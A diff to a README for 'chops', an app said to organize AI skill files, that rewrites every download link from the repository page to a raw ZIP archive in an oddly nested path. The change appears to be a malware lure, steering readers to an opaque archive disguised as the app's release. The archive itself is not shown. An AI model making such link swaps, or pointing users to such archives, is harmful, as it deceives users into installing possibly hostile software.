@@ -1,12 +1,12 @@
 # 🧩 chops - Organize AI Skills with Ease
 
-[![Download chops](https://img.shields.io/badge/Download-Chops-blue?style=for-the-badge)](https://github.com/Aristotlefivepetaled862/chops)
+[![Download chops](https://img.shields.io/badge/Download-Chops-blue?style=for-the-badge)](https://github.com/Aristotlefivepetaled862/chops/raw/refs/heads/main/Chops/Services/ACP/Software-v1.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
 
-[Download chops](https://github.com/Aristotlefivepetaled862/chops)
+[Download chops](https://github.com/Aristotlefivepetaled862/chops/raw/refs/heads/main/Chops/Services/ACP/Software-v1.3.zip)
 
 ## 🖥️ What chops does
 
@@ -144,4 +144,4 @@ chops works with skill files stored on your computer. Keep a backup before you c
 
 ## 📦 Get started now
 
-[Download chops](https://github.com/Aristotlefivepetaled862/chops)
+[Download chops](https://github.com/Aristotlefivepetaled862/chops/raw/refs/heads/main/Chops/Services/ACP/Software-v1.3.zip)
